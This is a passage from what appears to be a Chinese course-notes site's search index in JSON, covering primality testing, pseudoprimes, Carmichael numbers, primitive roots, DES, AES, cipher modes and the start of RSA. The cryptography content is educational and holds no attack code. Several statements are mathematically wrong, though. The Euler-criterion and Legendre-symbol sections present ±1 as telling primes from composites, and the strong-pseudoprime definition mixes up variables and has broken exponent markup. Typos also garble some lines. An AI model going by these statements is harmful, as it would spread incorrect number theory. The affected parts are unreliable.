\u5219\u8be5\u5947\u6570\u4e3a\u7d20\u6570</p>"},{"location":"course/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/%E7%AC%AC%E4%BA%94%E7%AB%A0-%E7%B4%A0%E6%80%A7%E6%A3%80%E6%B5%8B/#_6","title":"\u666e\u5229\u5179\u5224\u522b\u6cd5","text":"<p>\u8bbe\u5947\u6570\\(m \\gt 1\\)\uff0c\\(m-1 = nq\\)\uff0c\u5176\u4e2d\\(q\\)\u662f\u4e00\u5947\u7d20\u6570\u4e14\u6ee1\u8db3\\(2q+1 \\gt \\sqrt{m}\\)\u3002\u5982\u679c\u80fd\u627e\u5230\u4e00\u4e2a\u6570\\(a\\)\u6ee1\u8db3 $$ \\begin{cases} a^{m-1} \\equiv 1 \\pmod m \\\\ a^n \\not\\equiv 1 \\pmod m \\end{cases} $$ \u5219\\(m\\)\u4e3a\u7d20\u6570</p> <p>\u63a8\u8bba</p> <p>\u8bbe\u6574\u6570\\(m=2q+1\\)\uff0c\u5176\u4e2d\uff0c\\(q\\)\u4e3a\u7d20\u6570\uff0c\u5219 $$ \\begin{split} 2^{2q} &amp;\\equiv 1\\pmod m \\\\ &amp;\\Updownarrow \\\\ m&amp;\u662f\u7d20\u6570 \\end{split} $$</p>"},{"location":"course/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/%E7%AC%AC%E4%BA%94%E7%AB%A0-%E7%B4%A0%E6%80%A7%E6%A3%80%E6%B5%8B/#_7","title":"\u6ce2\u514b\u6797\u987f\u5224\u522b\u6cd5","text":"<p>\u8bbe\u6574\u6570\\(\\begin{cases}m&gt;2\\\\m-1=FR\\\\(F,R)=1\\end{cases}\\)\u3002\u5176\u4e2d\\(F\\)\u662f\\(m-1\\)\u5df2\u5206\u89e3\u7684\u4e00\u90e8\u5206\uff0c\\(R\\)\u662f\\(m-1\\)\u672a\u5206\u89e3\u7684\u4e00\u90e8\u5206\u3002</p> <p>\u5982\u679c\u5bf9\u4e8e\\(F\\)\u7684\u6bcf\u4e2a\u7d20\u6570\u56e0\u5b50\\(q_i\\)\uff0c\u90fd\u5b58\u5728\u6574\u6570\\(a_i \\gt 1\\)\uff0c\u6ee1\u8db3 $$ \\begin{cases} a_i^{m-1} \\equiv 1 \\pmod m \\\\ (a_i^{{m-1}\\over q_i}-1,m)=1 \\end{cases} $$ \u5219\\(m\\)\u7684\u6bcf\u4e00\u4e2a\u7d20\u56e0\u5b50\u90fd\u6ee1\u8db3\\(p \\equiv 1 \\pmod F\\)\uff0c\u8fdb\u4e00\u6b65\uff0c\u5982\u679c\\(F \\gt R\\)\uff0c\u5219\\(m\\)\u4e3a\u7d20\u6570</p>"},{"location":"course/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/%E7%AC%AC%E4%BA%94%E7%AB%A0-%E7%B4%A0%E6%80%A7%E6%A3%80%E6%B5%8B/#_8","title":"\u62df\u7d20\u6570","text":"<p>\u4e00\u4e2a\u5408\u6570\\(p\\)\u6ee1\u8db3\u7d20\u6570\u7684\u67d0\u4e2a\u6027\u8d28\uff0c\u5219\u6211\u4eec\u79f0\\(p\\)\u662f\u5173\u4e8e\u6b64\u6027\u8d28\u7684 \u62df\u7d20\u6570</p> <p>\u62df\u7d20\u6570\u4e4b\u95f4\u7684\u5173\u7cfb\uff1a\u5f3a\u62df\u7d20\u6570\u6b27\u62c9\u62df\u7d20\u6570\u8d39\u9a6c\u62df\u7d20\u6570\uff08\u5176\u4e2d\u8868\u793a\u5fc5\u8981\u6027\u7684\u5173\u7cfb\uff09</p>"},{"location":"course/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/%E7%AC%AC%E4%BA%94%E7%AB%A0-%E7%B4%A0%E6%80%A7%E6%A3%80%E6%B5%8B/#_9","title":"\u8d39\u9a6c\u62df\u7d20\u6570","text":"<p>\u5b9a\u4e49</p> <p>\u8bbe\u5408\u6570\\(m\\)\uff0c\u5982\u679c\u5b58\u5728\u6574\u6570\\(a\\)\u6ee1\u8db3 $$ \\begin{cases} (a,m)=1\\\\ a^{m-1}\\equiv 1 \\pmod m \\end{cases} $$ \u5219\u79f0\\(m\\)\u4e3a\u5bf9\u4e8e\u57fa\\(a\\)\u7684\uff08\u8d39\u9a6c\uff09\u62df\u7d20\u6570</p> <p>\u8d39\u9a6c\u5b9a\u7406\u662f\uff1a\u5f53\\(m\\)\u662f\u7d20\u6570\u65f6\uff0c\u4ee5\u4e0a\u516c\u5f0f\u4e00\u5b9a\u6ee1\u8db3\u3002\u8fd9\u662f\u5fc5\u8981\u6027\uff0c\u800c\u4e0d\u662f\u5145\u5206\u6027</p> <p>\u63a8\u8bba</p> <ul> <li> <p>\u5bf9\u4e8e\u6bcf\u4e00\u4e2a\u6574\u6570\\(a&gt;1\\)\uff0c\u5747\u5b58\u5728\u65e0\u6570\u4e2a\u57fa\\(a\\)\u7684\u8d39\u9a6c\u62df\u7d20\u6570</p> </li> <li> <p>\u8bbe\\(d,n \\in Z^+\\)\uff0c\u5219\u5b58\u5728\u5b9a\u7406  \\(d\\mid n \\Rightarrow 2^{d-1}\\mid 2^{n-1}\\)</p> </li> <li> <p>\u5982\u679c\\(n\\)\u662f\u5bf9\u4e8e\u57fa\\(2\\)\u7684\u8d39\u9a6c\u62df\u7d20\u6570\uff0c\u5219\\(m=2^n-1\\)\u4e5f\u662f\u57fa\\(2\\)\u7684\u8d39\u9a6c\u62df\u7d20\u6570</p> </li> <li> <p>\u8bbe\\(m\\)\u662f\u4e2a\u5947\u5408\u6570\uff0c\u5219</p> </li> <li> <p>\\(m\\)\u662f\u5bf9\u4e8e\u57fa\\(a\\)\u7684\u8d39\u9a6c\u62df\u7d20\u6570\uff0c\u5f53\u4e14\u4ec5\u5f53\\(a\\)\u6a21\\(m\\)\u7684\u9636\u6574\u9664\\(m-1\\)</p> </li> <li>\u5982\u679c\\(m\\)\u662f\u5206\u522b\u5bf9\u57fa\\(a\\)\u548c\u57fa\\(b\\)\u7684\u8d39\u9a6c\u62df\u7d20\u6570\uff0c\u5219\\(m\\)\u662f\u5bf9\u4e8e\u57fa\\(ab\\)\u7684\u8d39\u9a6c\u62df\u7d20\u6570</li> <li>\u5982\u679c\\(m\\)\u662f\u5bf9\u4e8e\u57fa\\(a\\)\u7684\u8d39\u9a6c\u4f60\u62df\u7d20\u6570\uff0c\u5219\\(m\\)\u4e5f\u662f\u5bf9\u4e8e\u57fa\\(a^{-1}(a^{-1}\\pmod m)\\)\u7684\u8d39\u9a6c\u62df\u7d20\u6570</li> <li>\u5982\u679c\u5b58\u5728\u4e00\u4e2a\u6574\u6570\uff0c\u4f7f\u5f97\\(a^{m-1}\\equiv 1 \\pmod m\\)\u4e0d\u6210\u7acb\uff0c\u5219\u5728\u6a21\\(m\\)\u7684\u7f29\u7cfb\u4e2d\uff0c\u81f3\u5c11\u6709\u4e00\u534a\u7684\u6570\u540c\u6837\u662f\u7684\u8fd9\u4e2a\u516c\u5f0f\u4e0d\u6210\u7acb</li> </ul>"},{"location":"course/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/%E7%AC%AC%E4%BA%94%E7%AB%A0-%E7%B4%A0%E6%80%A7%E6%A3%80%E6%B5%8B/#_10","title":"\u5361\u7c73\u6b47\u5c14\u6570","text":"<p>\u5b9a\u4e49</p> <p>\u8bbe\u5408\u6570\\(m\\)\uff0c\u5982\u679c\u5bf9\u4e8e\u6240\u6709\u7684\u6b63\u6574\u6570\\(a\\)\u6ee1\u8db3 $$ \\begin{cases} (a,m)=1\\\\ a^{m-1}\\equiv 1 \\pmod m \\end{cases} $$ \u5219\u79f0\\(m\\)\u4e3a\u5361\u7c73\u6b47\u5c14\u6570</p> <p>\u8d39\u9a6c\u62df\u7d20\u6570\u7684\u6761\u4ef6\u662f\u5b58\u5728\u4e00\u4e2a\\(\\exists a\\in Z^+\\)\uff0c\u800c\u8fd9\u91cc\u5bf9\u4e8e\\(\\forall a\\in Z^+\\)</p>"},{"location":"course/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/%E7%AC%AC%E4%BA%94%E7%AB%A0-%E7%B4%A0%E6%80%A7%E6%A3%80%E6%B5%8B/#_11","title":"\u6b27\u62c9\u62df\u7d20\u6570","text":"<p>\u5b9a\u4e49</p> <p>\u8bbe\u5947\u5408\u6570\\(m\\)\uff0c\u5982\u679c\u5b58\u5728\u6574\u6570\\(a\\)\u6ee1\u8db3 $$ \\begin{cases} (a,m)=1\\\\ a^{(m-1)\\over2}\\equiv ({a\\over m}) \\pmod m \\end{cases} $$ \u5219\u79f0\\(m\\)\u4e3a\u5bf9\u4e8e\u57fa\\(a\\)\u7684\u6b27\u62c9\u62df\u7d20\u6570</p> <p>\u6b27\u62c9-\u52d2\u8ba9\u5fb7\u5b9a\u7406\uff1a\\((a,m)\\)\u7684\u60c5\u51b5\u4e0b</p> \\[ \u6b27\u62c9\u5b9a\u7406 \\begin{cases} a^{(m-1)\\over2}\\equiv 1 \\pmod m &amp;m\u662f\u7d20\u6570\\\\ a^{(m-1)\\over2}\\equiv -1 \\pmod m &amp;m\u4e0d\u662f\u662f\u7d20\u6570 \\end{cases}\\\\\\\\ \\] \\[ \u52d2\u8ba9\u5fb7\u5b9a\u7406 \\begin{cases} ({a\\over m})\\equiv 1 \\pmod m &amp;m\u662f\u7d20\u6570\\\\ ({a\\over m})\\equiv -1 \\pmod m &amp;m\u4e0d\u662f\u662f\u7d20\u6570 \\end{cases}\\\\ \\] <p>\u63a8\u8bba</p> <ul> <li>\u82e5\\(m\\)\u662f\u5bf9\u4e8e\u57fa\\(a\\)\u7684\u6b27\u62c9\u62df\u7d20\u6570\uff0c\u5219\\(m\\)\u4e5f\u662f\u5bf9\u4e8e\u57fa\\(a\\)\u7684\uff08\u8d39\u9a6c\uff09\u62df\u7d20\u6570</li> <li>\u8bbe\\(m\\)\u662f\u4e00\u4e2a\u5947\u5408\u6570\uff0c\u5219\\(m\\)\u7684\u7f29\u7cfb\u4e2d\u81f3\u5c11\u6709\u4e00\u534a\u4f7f\u5f97\\(a^{(m-1)\\over2}\\equiv ({a\\over b}) \\pmod m\\)\u4e0d\u6210\u7acb\uff08\u540c\u8d39\u9a6c\u62df\u7d20\u6570\uff09</li> </ul>"},{"location":"course/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/%E7%AC%AC%E4%BA%94%E7%AB%A0-%E7%B4%A0%E6%80%A7%E6%A3%80%E6%B5%8B/#_12","title":"\u5f3a\u62df\u7d20\u6570","text":"<p>\u8bbe\u5947\u5408\u6570\\(m\\)\uff0c\u6b63\u6574\u6570\\(s\\)\u548c\u5947\u6570\\(t\\)\u6ee1\u8db3 $$ \\begin{cases} m-1 = 2^st\\\\ (a,p)=1\\\\ a^{(m-1)\\over2}\\equiv ({a\\over b}) \\pmod m \\end{cases} $$ \u5982\u679c\u6709 $$ \\begin{cases} a^t \\equiv 1 \\pmod p \\\\ \\quad\u6216\\\\ a<sup>{2</sup>rt} \\equiv -1 \\pmod m &amp;(0\\le r \\lt s) \\end{cases} $$</p> <p>\u5219\u79f0\\(m\\)\u4e3a\u5bf9\u4e8e\u57fa\\(a\\)\u7684\u5f3a\u62df\u7d20\u6570</p> <p>\u82e5\u5947\u7d20\u6570\\(m\\)\uff0c\u6b63\u6574\u6570\\(s\\)\u548c\u5947\u6570\\(t\\)\u6ee1\u8db3 $$ \\begin{cases} m-1 = 2^st\\\\ (a,p)=1\\\\ a^{(m-1)\\over2}\\equiv ({a\\over b}) \\pmod m \\end{cases} $$ \u5219\u4e00\u5b9a\u6ee1\u8db3\u4e0b\u5217\u4e24\u4e2a\u516c\u5f0f\u4e4b\u4e00 $$ \\begin{cases} a^t \\equiv 1 \\pmod p \\\\ a<sup>{2</sup>rt} \\equiv -1 \\pmod m &amp;(0\\le r \\lt s) \\end{cases} $$ </p> <p>\u63a8\u8bba</p> <ul> <li>\u5b58\u5728\u65e0\u7a77\u591a\u4e2a\u5bf9\u4e8e\u57fa\\(2\\)\u7684\u5f3a\u62df\u7d20\u6570</li> <li>\u5982\u679c\\(m\\)\u662f\u5bf9\u4e8e\u57fa\\(a\\)\u7684\u5f3a\u62df\u7d20\u6570\uff0c\u5219m\u662f\u5bf9\u4e8e\u57fa\\(a\\)\u7684\u6b27\u62c9\u62df\u7d20\u6570\uff08\u4e5f\u662f\u8d39\u9a6c\u62df\u7d20\u6570\uff09</li> <li>\u8bbe\\(m\\)\u662f\u4e00\u4e2a\u5947\u5408\u6570\uff0c\u5219\\(m\\)\u662f\u5bf9\u4e8e\u57fa\\(a(2 \\le a \\le n-1,(a,n)=1)\\)\u7684\u5f3a\u62df\u7d20\u6570\u7684\u53ef\u80fd\u6027\u81f3\u591a\u4e3a25%\u3002</li> </ul>"},{"location":"course/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E3%80%8A%E5%8E%9F%E6%A0%B9%E4%B8%8E%E9%98%B6%E3%80%8B/","title":"\u539f\u6839\u4e0e\u9636","text":""},{"location":"course/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E3%80%8A%E5%8E%9F%E6%A0%B9%E4%B8%8E%E9%98%B6%E3%80%8B/#_1","title":"\u300a\u539f\u6839\u4e0e\u9636\u300b","text":""},{"location":"course/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E3%80%8A%E5%8E%9F%E6%A0%B9%E4%B8%8E%E9%98%B6%E3%80%8B/#_2","title":"\u539f\u6839\u4e0e\u9636\u7684\u5b9a\u4e49","text":""},{"location":"course/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E3%80%8A%E5%8E%9F%E6%A0%B9%E4%B8%8E%E9%98%B6%E3%80%8B/#_3","title":"\u9636","text":"<p>\u5b9a\u4e49</p> \\[ \\begin{cases} (g,m)=1\\\\\\\\ g^d\\equiv 1\\pmod m \\end{cases} \\] <p>\u6ee1\u8db3\u4e0a\u9762\u516c\u5f0f\u7684\u6700\u5c0f\u6b63\u6574\u6570\\(d_0\\)\u88ab\u79f0\u4e3a\\(g\\)\u6a21\\(m\\)\u7684\u9636\uff08\u6216\u8005\u6b21\u6570\uff09\uff0c\u8bb0\u4f5c\\(ord_gm=d_0\\)</p> <p>\u6b27\u62c9\u5b9a\u7406\uff1a $$ \\begin{cases} (g,m)=1\\\\ g^\\phi(m)\\equiv 1\\pmod m &amp;\\phi(m)\u662fm\u7684\u6b27\u62c9\u51fd\u6570 \\end{cases} $$ </p> <p>\u63a8\u8bba</p> <ul> <li>\\(ord_gm \\mid \\phi(m)\\)</li> <li>\u4e00\u4e2a\u6570\u7684\u539f\u6839\u6a21\\(m\\)\u7684\u539f\u6839\u4e00\u5b9a\u662f\\(ord_gm\\)\u7684\u56e0\u6570\u4e4b\u4e00</li> </ul>"},{"location":"course/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E3%80%8A%E5%8E%9F%E6%A0%B9%E4%B8%8E%E9%98%B6%E3%80%8B/#_4","title":"\u539f\u6839","text":"<p>\u5b9a\u4e49</p> <p>\u5982\u679c\\(g\\)\u6a21\\(m\\)\u7684\u9636\u6070\u597d\u662f\\(\\phi(m)\\)\uff0c\u5373\\(m\\)\u7684\u6b27\u62c9\u51fd\u6570\uff0c\u5219\u79f0\\(g\\)\u4e3a\u6a21\\(m\\)\u7684\u4e00\u4e2a\u539f\u6839\uff08\u4e00\u4e2a\\(g\\)\u53ef\u80fd\u6709\u591a\u4e2a\u539f\u6839\uff09</p> <p>\u6362\u53e5\u8bdd\u8bf4\u5c31\u662f $$ \\begin{cases} (g,m)=1\\\\ g^d\\equiv 1\\pmod m \\end{cases} $$</p> <p>\u6ee1\u8db3\u4e0a\u9762\u516c\u5f0f\u7684\u6700\u5c0f\u6b63\u6574\u6570\\(d_0\\)\u6070\u597d\u6070\u597d\u7b49\u4e8e\\(\\phi(m)\\)\u7684\u6574\u6570\\(g\\)\uff0c\u88ab\u79f0\u4e3a\u6a21\\(m\\)\u7684\u539f\u6839\uff08\u4e4b\u4e00\uff09</p> <p>\u63a8\u8bba</p> <ul> <li> <p>\\(g\\)\u662f\\(m\\)\u539f\u6839\u7684\u5145\u8981\u6761\u4ef6\u662f\\(g,g^2,\\cdots,g^{\\phi(m)}\\)\u6784\u6210m\u7684\u4e00\u7ec4\u7f29\u7cfb</p> </li> <li> <p>\u8bbe\\(g\\)\u6a21\\(m\\)\u7684\u9636\u662f\\(d\\)\uff0c\u5219\\(1,g,\\cdots,g^{d-1}\\)\u6a21\\(m\\)\u4e24\u4e24\u4e0d\u540c\u4f59</p> </li> <li> <p>\u5982\u679c\\((g,m)=1\\)\uff0c\u5219\u6709   $$   g^r \\equiv g^s \\pmod m \\\\Updownarrow \\ r \\equiv s \\pmod {ord_gm}   $$</p> </li> <li> <p>\u5982\u679c\\(p\\)\u4e3a\u7d20\u6570\uff0c\u5219\u540c\u4f59\u65b9\u7a0b\\(x^k\\equiv 1 \\pmod p\\)\u6709\\((k,p-1)\\)\u4e2a\u89e3</p> </li> <li> <p>\u7d20\u6570\\(p\\)\u7684\u539f\u6839\u6570\u91cf\u4e3a\\(\\phi(p-1)\\)</p> </li> </ul>"},{"location":"course/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81/","title":"\u5206\u7ec4\u5bc6\u7801","text":""},{"location":"course/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81/#_2","title":"\u5206\u7ec4\u5bc6\u7801\u6982\u8ff0","text":"<p>\u7279\u70b9</p> <ul> <li>\u5b89\u5168\u6027\u4f9d\u8d56\u5bc6\u7801</li> <li>\u52a0\u5bc6\u79d8\u94a5=\u89e3\u5bc6\u5bc6\u94a5</li> <li>\u901f\u5ea6\u5feb\uff0c\u6613\u5b9e\u73b0</li> </ul> <p>\u5b9e\u73b0</p> <ul> <li>DES</li> <li>Blowfish</li> <li>IDEA</li> <li>LOKI</li> <li>RC5</li> <li>AES</li> </ul> <p>\u5206\u7ec4\u5bc6\u7801\u548c\u5e8f\u5217\u5bc6\u7801</p> <ul> <li> <p>\u5e8f\u5217\u5bc6\u7801\uff08\u6d41\u5bc6\u7801\uff09\uff1a\u5355\u72ec\u52a0\u5bc6\u6bcf\u4e2a\u4f4d     </p> </li> <li> <p>\u5206\u7ec4\u5bc6\u7801\uff1a\u6bcf\u6b21\u4f7f\u7528\u76f8\u540c\u7684\u5bc6\u94a5\u52a0\u5bc6\u6574\u4e2a\u660e\u6587\u5206\u7ec4</p> </li> </ul> <p>\u5206\u7ec4\u5bc6\u7801\u7684\u57fa\u672c\u539f\u7406</p> <ul> <li> <p>\u4ee3\u6362</p> </li> <li> <p>\u6269\u6563</p> </li> </ul> <p>\u4f7f\u660e\u6587\u5bc6\u6587\u95f4\u7684\u7edf\u8ba1\u5173\u7cfb\u53d8 \u5f97\u590d\u6742\uff0c\u4f7f\u653b\u51fb\u8005\u65e0\u6cd5\u5f97\u5230\u4ece\u5bc6\u6587\u63a8\u51fa\u660e\u6587</p> <ul> <li>\u6df7\u6dc6</li> </ul> <p>\u4f7f\u5bc6\u6587\u548c\u5bc6\u94a5\u4e4b\u95f4\u7684\u7edf\u8ba1\u5173\u7cfb\u53d8\u5f97\u5c3d\u53ef\u80fd \u590d\u6742\uff0c\u4ee5\u4f7f\u653b\u51fb\u8005\u65e0\u6cd5\u5f97\u5230\u5bc6\u94a5</p> <p></p> <p>\u5206\u7ec4\u5bc6\u7801\u7ed3\u6784</p> <p></p> <ol> <li>Feistel\u5206\u7ec4\u5bc6\u7801\u7684\u7279\u70b9</li> <li>\u6700\u540e\u4e00\u8f6e\u6ca1\u6709\u8fdb \u884c\u5de6\u53f3\u4ea4\u6362</li> <li>\u5229\u7528\u540c\u4e00\u7b97\u6cd5\u5b9e\u73b0\u52a0\u89e3\u5bc6</li> <li>SP\u5206\u7ec4\u5bc6\u7801\u7ed3\u6784\u548c\u7279\u70b9</li> <li>\u4ee3\u6362S\uff08\u4ee3\u6362\uff09\u4e00\u822c\u79f0\u4e3a\u6df7\u6dc6\u5c42</li> <li>\u7f6e\u6362\u6216\u53ef\u9006\u7684\u7ebf\u6027\u53d8\u6362P\u4e00\u822c\u79f0\u4e3a\u6269\u6563\u5c42</li> <li>SP\u7f51\u7edc\u53ef\u4ee5\u770b\u4f5cFeistel\u7f51\u7edc\u7684\u63a8\u5e7f\uff0c\u4f46SP\u578b \u5206\u7ec4\u5bc6\u7801\u7684\u52a0\u5bc6\u8fc7\u7a0b\u4e0e\u89e3\u5bc6\u8fc7\u7a0b\u4e00\u822c\u4e0d\u76f8\u4f3c</li> </ol>"},{"location":"course/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81/#des","title":"DES","text":"<p>\u52a0\u5bc6\u6d41\u7a0b</p> <ol> <li>\u521d\u59cb\u7f6e\u6362\\(IP\\)</li> <li>16\u8f6e\u8fed\u4ee3</li> <li>\u521d\u59cb\u7f6e\u6362\\(IP^{-1}\\)</li> </ol> <p>\u8f6e\u5bc6\u94a5\u751f\u6210</p> <p>16\u8f6e\u8fed\u4ee3\u7684\u6bcf\u4e00\u8f6e\u79d8\u94a5\u90fd\u4e0d\u76f8\u540c\u3002\u6bcf\u4e00\u8f6e\u8fed\u4ee3\u4f7f\u7528\u7684\u79d8\u94a5\u957f\u5ea6\u5747\u4e3a48bit\u3002\u8fd948bit\u7684\u8f6e\u5bc6\u94a5\u751f\u6210\u89c4\u5219\u5982\u4e0b\uff1a</p> <p>\u9996\u5148\u901a\u8fc7PC\u20131\u7f6e\u6362 \u5c0664bits\u53d8\u6362\u621056bits\uff0c \u7136\u540e\u518d\u901a\u8fc716\u8f6e\u7684\u5faa\u73af \u79fb\u4f4d\u548cPC\u20132\u7f6e\u6362\u5904\u7406 \u5c31\u53ef\u4ee5\u5f97\u523016\u4e2a48bits \u7684\u8f6e\u5bc6\u94a5</p> <p></p> <p>\u52a0\u5bc6\u51fd\u6570</p> <p>\u52a0\u5bc6\u51fd\u6570\\(F\\)\u662f\u6574\u4e2aDES\u7b97\u6cd5\u7684\u6838xz\u5fc3</p> <pre><code>graph \nA(\u6269\u5c55\u7f6e\u6362E -- 32bit-&gt;48bit)--&gt;B(\u5f02\u6216\u8fd0\u7b97 -- \u548c48bit\u7684\u8f6e\u5bc6\u94a5\u5f02\u6216\u8fd0\u7b97)--&gt;S(S\u76d2\u53d8\u6362  \u6838\u5fc3 -- 48bit-&gt;32bit)--&gt;P(\u7f6e\u6362P -- \u7ed3\u679c\u91cd\u6392)-.-&gt;A\n</code></pre>"},{"location":"course/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81/#aes","title":"AES","text":"<p>\u7279\u70b9</p> <ul> <li> <p>\u5b89\u5168\u3001\u9ad8\u6548\u3001\u6613\u5b9e\u73b0\u3001\u7075\u6d3b</p> </li> <li> <p>AES\u4e2d\u5206\u7ec4\u957f\u5ea6\u53ea\u80fd\u662f128bit\uff0c\u4f46\u662f\u5bc6\u94a5\u957f\u5ea6\u53ef\u4ee5\u662f128bit\u3001192bit\u3001256bit\uff08\u4f9d\u6b21\u589e\u52a064bit\uff09</p> </li> <li> <p>\u5bc6\u94a5\u957f\u5ea6\u4e0d\u540c\uff0c\u52a0\u5bc6\u8f6e\u6570\u4e0d\u540c</p> </li> </ul> AES\u7b97\u6cd5 \u5bc6\u94a5\u957f\u5ea6 \u5206\u7ec4\u957f\u5ea6 \u52a0\u5bc6\u8f6e\u6570 AES-128 128bit 128bit 10 AES-192 192bit 128bit 12 AES-256 256bit 128bit 14 <p>\u7b97\u6cd5\u8fc7\u7a0b\uff08\u4ee5AES-128\u4e3a\u4f8b\uff09</p> <ul> <li> <p>AES\u5904\u7406\u7684\u57fa\u672c\u5355\u4f4d\u662f\u5b57\u8282\uff08DES\u5904\u7406\u7684\u57fa\u672c\u5355\u4f4d\u662f\u6bd4\u7279\uff09</p> </li> <li> <p>128bit\u7684\u660e\u6587P\u548c\u8f93\u5165\u79d8\u94a5K\u90fd\u88ab\u5206\u4e3a16\u5b57\u8282</p> </li> <li> <p>\u52a0\u5bc6\u8fc7\u7a0b\u548c\u89e3\u5bc6\u8fc7\u7a0b\u4e0d\u4e00\u81f4\uff08SP\u5206\u7ec4\u7ed3\u6784\uff0c\u533a\u522bFeistel\u7ed3\u6784\u7684DES\uff09</p> </li> <li> <p>\u53ea\u6709\u8f6e\u5bc6\u94a5\u52a0\u9636\u6bb5\u4f7f\u7528\u4e86\u5bc6\u94a5</p> </li> <li> <p>\u72b6\u6001\u77e9\u9635\uff08\u4ece\u4e0a\u5230\u4e0b\u3001\u4ece\u5de6\u81f3\u53f3\uff09</p> </li> </ul> <p></p> <p></p> <p>\u6bcf\u4e00\u8f6e\u7684\u52a0\u5bc6\u8fc7\u7a0b</p> <pre><code>graph \nA(\u5b57\u8282\u4ee3\u6362 -- \u4f7f\u7528S\u76d2\u66ff\u6362\u6bcf\u4e2a\u5b57\u8282)--&gt;B(\u884c\u79fb\u4f4d -- \u5c06\u660e\u6587\u7684\u72b6\u6001\u77e9\u9635\u6bcf\u4e00\u884c\u79fb\u4f4d\u5bf9\u5e94\u7684\u4f4d\u6570)--&gt;C(\u5217\u6df7\u5408 -- \u548c\u56fa\u5b9a\u77e9\u9635\u76f8\u4e58)--&gt;D([\u8f6e\u5bc6\u94a5\u52a0 -- \u548c128bit\u7684\u79d8\u94a5\u4f4d\u5f02\u6216 XOR])\nE(\u5bc6\u94a5\u6269\u5c55 -- \u901a\u8fc7\u79cd\u5b50\u5bc6\u94a5\u751f\u6210\u591a\u91cd\u5bc6\u94a5)\n</code></pre>"},{"location":"course/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81/#_3","title":"\u5206\u7ec4\u5bc6\u7801\u7684\u5de5\u4f5c\u6a21\u5f0f","text":"<p>DES\u7684\u56db\u79cd\u5de5\u4f5c\u6a21\u5f0f</p> \u5bc6\u7801 \u6a21\u5f0f \u7535\u5b50\u5bc6\u7801\u672c\uff08ECB\uff09 \u5bc6\u6587\u5206\u7ec4\u94fe\u63a5\uff08CBC\uff09 \u5bc6\u6587\u53cd\u9988\uff08CFB\uff09 \u8f93\u51fa\u53cd\u9988\uff08OFB\uff09 \u8ba1\u6570\u5668\u6a21\u5f0f\uff08CTR\uff09"},{"location":"course/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81/#_4","title":"\u516c\u94a5\u5bc6\u7801","text":""},{"location":"course/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81/#_5","title":"\u516c\u94a5\u5bc6\u7801\u4f53\u5236\u6982\u8ff0","text":"<p>\u4f7f\u7528\u4e00\u5bf9\u5bc6\u94a5\uff08\u516c\u94a5\u548c\u79c1\u94a5\uff09\uff0c\u516c\u94a5\u548c\u79c1\u94a5\u4e0d\u53ef\u4e92\u76f8\u6c42\u89e3</p> <p>\u516c\u94a5\u5bc6\u7801\u7684\u8bbe\u8ba1\u8981\u6c42</p> <ul> <li>\u751f\u6210\u5bc6\u94a5\u5bf9\u5bb9\u6613</li> <li>\u901a\u8fc7\u516c\u94a5\u6c42\u79c1\u94a5\u662f\u5728\u8ba1\u7b97\u4e0a\u4e0d\u53ef\u884c\u7684</li> <li>\u52a0\u5bc6\u548c\u89e3\u5bc6\u7684\u6b21\u5e8f\u53ef\u6362</li> <li>\u672c\u8d28\u4e0a\u662f\u4e00\u4e2a\u5355\u9879\u9677\u95e8\u51fd\u6570</li> </ul>"},{"location":"course/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81/#rsa","title":"RSA\u516c\u94a5\u5bc6\u7801\u4f53\u5236","text":"<ul> <li> <p>\u5bc6\u94a5\u7684\u751f\u6210</p> </li> <li> <p>\u9009\u62e9\u8fde\u4e2a\u8f83\u5927\u7684\u6811\\(p\\),\\(q\\)</p> </li> <li>\u8ba1\u7b97\\(n=pq\\)\uff0c\\(\\phi(n)=(p-1)(q-1)\\)</li> <li>\u968f\u673a\u9009\u53d6\u548c\\(\\phi(n)\\)\u4e92\u8d28\u7684\u6811\\(e\uff08e \\lt n\uff09\\)</li> <li>\u6c42\u89e3d\uff0c\u4f7f\u5f97\\(ed \\equiv 1 